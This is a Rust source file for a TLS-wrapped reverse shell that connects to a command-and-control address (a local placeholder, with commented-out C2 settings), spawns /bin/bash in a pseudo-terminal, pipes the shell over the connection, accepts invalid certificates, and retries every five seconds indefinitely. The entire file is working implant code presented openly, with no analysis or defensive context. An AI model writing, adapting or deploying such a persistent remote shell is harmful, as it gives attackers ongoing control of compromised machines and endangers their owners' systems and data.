use tokio::{
    net::TcpStream as TokioTcpStream,
    io::{AsyncReadExt, AsyncWriteExt}, // We use raw Read/Write, not BufRead/Line
};
use portable_pty::{CommandBuilder, NativePtySystem, PtySize, PtySystem};
use std::io::{Read, Write}; // Standard sync IO traits for the PTY
use tokio_native_tls::native_tls::TlsConnector;


#[tokio::main]
async fn main() {
    loop {
        match reverse_shell().await {
            Ok(_) => println!("Goodbye."),
            Err(e) => eprintln!("Connection error: {}. Retrying in 5 seconds...", e),
        }

        tokio::time::sleep(std::time::Duration::from_secs(5)).await;
    }
}


async fn reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
    let cx = TlsConnector::builder()
        .danger_accept_invalid_certs(true)
        .build()?;
    let cx = tokio_native_tls::TlsConnector::from(cx);

    //const C2_ADDR: &str = env!("C2_ADDR");
    //const C2_PORT: &str = env!("C2_PORT");

    let stream = TokioTcpStream::connect("127.0.0.1:4444").await?;
    let stream = cx.connect("127.0.0.1", stream).await?;
    // Split TCP into Read/Write
    let (mut tcp_reader, mut tcp_writer) = tokio::io::split(stream);

    // Setup PTY
    let pty_system = NativePtySystem::default();
    let pty_pair = pty_system.openpty(PtySize {
        rows: 24, cols: 80, pixel_width: 0, pixel_height: 0,
    }).expect("Failed to create PTY");

    let mut _cmd = CommandBuilder::new("/bin/bash");
    _cmd.env("TERM", "xterm-256color");
    let _bash = pty_pair.slave.spawn_command(_cmd).expect("Failed to spawn shell");

    // Get PTY handles (Blocking!)
    let mut pty_reader = pty_pair.master.try_clone_reader().unwrap();
    let mut pty_writer = pty_pair.master.take_writer().unwrap();

    let (tx, mut rx) = tokio::sync::mpsc::channel::<Vec<u8>>(64);

    tokio::task::spawn_blocking(move || {
        let mut buf = [0u8; 4096];
        loop {
            // This blocks until Bash has output
            match pty_reader.read(&mut buf) {
                Ok(n) if n > 0 => {
                    // Send the data to the main async loop
                    let _ = tx.blocking_send(buf[..n].to_vec());
                }
                _ => break, // EOF or error
            }
        }
    });

    let mut tcp_buf = [0u8; 4096];

    loop {
        tokio::select! {
            result = tcp_reader.read(&mut tcp_buf) => {
                match result {
                    Ok(n) if n > 0 => {
                        pty_writer.write_all(&tcp_buf[..n])?;
                        pty_writer.flush()?; 
                    }
                    _ => break,
                }
            }

            Some(data) = rx.recv() => {
                tcp_writer.write_all(&data).await?;
                tcp_writer.flush().await?;
            }
        }
    }

    Ok(())
}